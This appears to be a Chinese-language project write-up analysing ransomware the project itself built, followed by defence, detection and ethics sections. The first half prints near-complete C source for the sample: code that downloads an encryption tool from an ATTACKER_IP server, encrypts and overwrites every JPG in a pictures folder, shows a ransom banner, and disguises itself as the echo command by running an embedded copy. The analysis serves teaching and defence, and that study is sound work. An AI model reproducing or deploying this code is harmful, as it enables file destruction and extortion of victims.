# Ransomware Attacks Analysis - Advanced Malware Techniques

## 勒索軟體攻擊概述 (Ransomware Attack Overview)

Ransomware 是一種惡意軟體，它會加密受害者的檔案並要求贖金來解密。本專案實現的勒索軟體展示了現代勒索軟體的典型特徵，包括檔案加密、偽裝技術、和自動化部署。

## 勒索軟體攻擊類型 (Types of Ransomware Attacks)

### 1. 檔案加密勒索軟體 (File-Encrypting Ransomware)
- **攻擊目標**: 用戶的重要檔案
- **加密方式**: 使用對稱加密演算法 (AES)
- **贖金要求**: 要求支付贖金來獲得解密金鑰
- **影響範圍**: 單一系統或整個網路

### 2. 系統鎖定勒索軟體 (System-Locking Ransomware)
- **攻擊目標**: 整個作業系統
- **鎖定方式**: 阻止用戶存取系統
- **贖金要求**: 要求支付贖金來解除鎖定
- **影響範圍**: 整個系統無法使用

### 3. 混合型勒索軟體 (Hybrid Ransomware)
- **攻擊目標**: 檔案和系統同時攻擊
- **攻擊方式**: 結合檔案加密和系統鎖定
- **贖金要求**: 多重贖金要求
- **影響範圍**: 最大化的破壞效果

## 本專案實現的勒索軟體分析 (Implemented Ransomware Analysis)

### 攻擊流程分析

#### 1. 初始感染階段
```c
int main(int argc, char *argv[]) {
    // 1. 下載 aes-tool
    if (download_file("aes-tool", "/tmp/aes-tool") != 0) {
        fprintf(stderr, "❌ 無法下載 aes-tool\n");
        return 1;
    }
    chmod("/tmp/aes-tool", 0755);

    // 2. 加密 victim 照片
    encrypt_jpgs_in_app_pictures("/app/Pictures");

    // 3. 顯示 banner
    if (download_file("banner", "/tmp/banner") == 0) {
        show_banner("/tmp/banner");
    } else {
        fprintf(stderr, "⚠ 無法下載 banner\n");
    }

    // 4. 解壓與執行 echo
    restore_and_execute_echo(argc, argv);

    remove("/tmp/banner");
    remove("/tmp/aes-tool");

    return 0;
}
```

**感染流程**:
1. **工具下載**: 從攻擊者伺服器下載加密工具
2. **檔案加密**: 加密目標目錄中的檔案
3. **勒索訊息**: 顯示勒索要求
4. **偽裝執行**: 執行原始命令以維持偽裝

#### 2. 檔案加密機制
```c
void encrypt_jpgs_in_app_pictures() {
    const char *dir_path = "/app/Pictures/";
    DIR *dir = opendir(dir_path);
    struct dirent *entry;

    if (!dir) {
        perror("Failed to open /app/Pictures/");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            const char *filename = entry->d_name;
            size_t len = strlen(filename);

            // Check if filename ends with .jpg
            if (len > 4 && strcmp(filename + len - 4, ".jpg") == 0) {
                char input_path[512];
                char temp_output_path[512];
                char cmd[1024];

                snprintf(input_path, sizeof(input_path), "%s%s", dir_path, filename);
                snprintf(temp_output_path, sizeof(temp_output_path), "%s%s.tmp", dir_path, filename);
                snprintf(cmd, sizeof(cmd), "/tmp/aes-tool enc \"%s\" \"%s\"", input_path, temp_output_path);

                // 執行加密
                system(cmd);

                // 刪除原始檔
                remove(input_path);
                rename(temp_output_path, input_path); // 把 temp 改回原本檔名
            }
        }
    }

    closedir(dir);
}
```

**加密特點**:
- **目標選擇**: 專門針對 JPG 圖片檔案
- **加密工具**: 使用外部 AES 加密工具
- **檔案替換**: 直接替換原始檔案
- **批次處理**: 自動處理目錄中的所有目標檔案

#### 3. 偽裝技術分析
```c
void restore_and_execute_echo(int argc, char *argv[]) {
    const char *gz_path = "echo.gz";
    const char *echo_path = "orin_echo";

    // 寫入 echo.gz
    FILE *fp = fopen(gz_path, "wb");
    if (!fp) {
        perror("fopen gzip");
        return;
    }
    fwrite(echo_gz, 1, echo_gz_len, fp);
    fclose(fp);

    // 解壓縮成 echo 可執行檔
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "gzip -d -c %s > %s", gz_path, echo_path);
    if (system(cmd) != 0) {
        fprintf(stderr, "❌ 解壓縮 echo.gz 失敗\n");
        return;
    }

    // 設定可執行權限
    chmod(echo_path, 0755);

    // 準備參數（argv[0] 為 "echo"，argv[1...] 是原始參數）
    char *exec_args[argc + 1];
    exec_args[0] = "echo";
    for (int i = 1; i < argc; ++i) {
        exec_args[i] = argv[i];
    }
    exec_args[argc] = NULL;

    // fork + execv
    pid_t pid = fork();
    if (pid == 0) {
        execv(echo_path, exec_args);
        perror("execv");
        exit(1);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    } else {
        perror("fork");
    }
    remove(gz_path);
    remove(echo_path);
}
```

**偽裝特點**:
- **內嵌原始程式**: 將原始 echo 程式壓縮並內嵌
- **動態解壓**: 執行時解壓縮原始程式
- **參數傳遞**: 保持原始命令的參數
- **清理機制**: 執行後清理臨時檔案

## 勒索軟體技術分析 (Ransomware Techniques Analysis)

### 1. 加密演算法分析

#### AES 加密
```bash
# 使用 AES 加密工具
/tmp/aes-tool enc "input.jpg" "output.jpg.tmp"
```

**加密特點**:
- **對稱加密**: 使用相同的金鑰進行加密和解密
- **高安全性**: AES 是業界標準的加密演算法
- **高效能**: 適合大量檔案的加密處理

#### 金鑰管理
- **金鑰生成**: 攻擊者生成隨機金鑰
- **金鑰傳輸**: 金鑰通常不會傳輸給受害者
- **金鑰銷毀**: 加密完成後銷毀金鑰

### 2. 檔案系統攻擊

#### 目標檔案選擇
```c
// 只加密 JPG 檔案
if (len > 4 && strcmp(filename + len - 4, ".jpg") == 0) {
    // 執行加密
}
```

**選擇策略**:
- **檔案類型**: 針對特定類型的檔案
- **檔案大小**: 通常選擇較大的檔案
- **檔案重要性**: 選擇用戶重要的檔案

#### 檔案操作
```c
// 加密檔案
system(cmd);

// 刪除原始檔
remove(input_path);

// 替換檔案
rename(temp_output_path, input_path);
```

**操作特點**:
- **就地加密**: 直接替換原始檔案
- **批次處理**: 自動處理多個檔案
- **錯誤處理**: 包含基本的錯誤處理

### 3. 網路通訊分析

#### 攻擊者伺服器通訊
```c
int download_file(const char *request, const char *output_path) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    send(sock, request, strlen(request), 0);
    // ... 接收檔案
}
```

**通訊特點**:
- **TCP 連接**: 使用可靠的 TCP 協定
- **檔案下載**: 下載加密工具和勒索訊息
- **簡單協定**: 使用簡單的請求-回應協定

## 勒索軟體防護分析 (Ransomware Defense Analysis)

### 1. 預防措施 (Prevention Measures)

#### 檔案備份
```bash
# 定期備份重要檔案
rsync -av /home/user/Documents/ /backup/documents/
rsync -av /home/user/Pictures/ /backup/pictures/
```

**備份策略**:
- **定期備份**: 建立自動化備份排程
- **離線備份**: 使用離線儲存媒體
- **版本控制**: 保留多個備份版本

#### 檔案監控
```bash
# 監控檔案系統變化
inotifywait -m -r -e modify,create,delete /home/user/
```

**監控要點**:
- **即時監控**: 監控檔案的即時變化
- **異常檢測**: 檢測異常的檔案操作
- **警報機制**: 發現異常時立即警報

#### 權限控制
```bash
# 限制檔案存取權限
chmod 644 /home/user/Documents/
chmod 755 /home/user/Documents/
```

**權限策略**:
- **最小權限**: 只給予必要的存取權限
- **用戶隔離**: 限制用戶間的檔案存取
- **系統保護**: 保護系統重要檔案

### 2. 檢測機制 (Detection Mechanisms)

#### 行為分析
```python
# 範例: 檢測異常的檔案加密行為
def detect_ransomware_behavior():
    if file_encryption_rate > threshold:
        alert("Potential ransomware activity detected")
    
    if suspicious_file_operations > limit:
        alert("Suspicious file operations detected")
```

**檢測指標**:
- **檔案加密率**: 監控檔案加密的速度
- **檔案操作模式**: 檢測異常的檔案操作
- **網路通訊**: 監控可疑的網路活動

#### 特徵檢測
```bash
# 檢測已知的勒索軟體特徵
grep -r "encrypt" /home/user/
grep -r "ransom" /home/user/
```

**檢測方法**:
- **字串匹配**: 檢測勒索軟體的特徵字串
- **檔案特徵**: 檢測勒索軟體的檔案特徵
- **行為特徵**: 檢測勒索軟體的行為特徵

### 3. 回應措施 (Response Measures)

#### 隔離感染系統
```bash
# 立即斷開網路連接
ifconfig eth0 down

# 停止可疑程序
killall -9 suspicious_process
```

**隔離步驟**:
1. **網路隔離**: 立即斷開網路連接
2. **程序終止**: 停止可疑的程序
3. **系統保護**: 保護未感染的系統

#### 檔案恢復
```bash
# 從備份恢復檔案
rsync -av /backup/documents/ /home/user/Documents/
rsync -av /backup/pictures/ /home/user/Pictures/
```

**恢復策略**:
1. **備份恢復**: 從最近的備份恢復檔案
2. **版本控制**: 使用版本控制系統恢復
3. **專業恢復**: 尋求專業的資料恢復服務

## 勒索軟體演進趨勢 (Ransomware Evolution Trends)

### 1. 技術演進

#### 加密技術
- **混合加密**: 結合對稱和非對稱加密
- **自適應加密**: 根據檔案類型選擇加密方式
- **金鑰管理**: 更複雜的金鑰管理機制

#### 傳播技術
- **網路傳播**: 利用網路漏洞進行傳播
- **社交工程**: 使用更精細的社交工程技術
- **供應鏈攻擊**: 攻擊軟體供應鏈

### 2. 攻擊目標

#### 企業攻擊
- **大型企業**: 針對大型企業的定向攻擊
- **關鍵基礎設施**: 攻擊關鍵基礎設施
- **政府機構**: 攻擊政府機構和公共服務

#### 攻擊方式
- **雙重勒索**: 同時進行檔案加密和資料竊取
- **三重勒索**: 增加 DDoS 攻擊威脅
- **供應鏈攻擊**: 攻擊軟體供應鏈

### 3. 防護技術

#### 新興防護技術
- **AI 檢測**: 使用人工智慧進行威脅檢測
- **行為分析**: 基於行為的威脅檢測
- **零信任架構**: 實施零信任安全架構

#### 協作防護
- **威脅情報**: 共享威脅情報
- **協作防護**: 建立協作防護機制
- **國際合作**: 加強國際合作

## 法律和道德考量 (Legal and Ethical Considerations)

### 1. 法律責任

#### 刑事責任
- **電腦犯罪**: 可能違反電腦犯罪相關法律
- **勒索罪**: 可能涉及勒索犯罪
- **破壞罪**: 可能涉及財產破壞罪

#### 民事責任
- **損害賠償**: 可能面臨巨額損害賠償
- **業務中斷**: 可能造成業務中斷損失
- **聲譽損害**: 可能造成聲譽損害

### 2. 道德考量

#### 研究倫理
- **知情同意**: 必須獲得所有相關方的同意
- **最小傷害**: 最小化對他人的傷害
- **透明度**: 保持研究的透明度

#### 社會責任
- **安全意識**: 提高社會的安全意識
- **技術發展**: 促進安全技術的發展
- **教育目的**: 用於教育和研究目的

## 結論 (Conclusion)

勒索軟體是一種嚴重的網路安全威脅，可能導致：

1. **資料損失**: 重要檔案被加密無法存取
2. **經濟損失**: 可能造成巨大的經濟損失
3. **業務中斷**: 可能導致業務運營中斷
4. **聲譽損害**: 可能損害組織的聲譽

有效的防護需要多層次的方法：

1. **預防措施**: 備份、監控、權限控制
2. **檢測機制**: 行為分析、特徵檢測
3. **回應措施**: 隔離、恢復、修復
4. **持續改進**: 學習、適應、演進

理解這些攻擊技術有助於：
- 提高網路安全意識
- 開發更好的防護機制
- 進行有效的安全測試
- 教育用戶安全最佳實踐

記住，這些技術應該只用於合法的安全研究和教育目的，並且必須遵守相關的法律和道德規範。
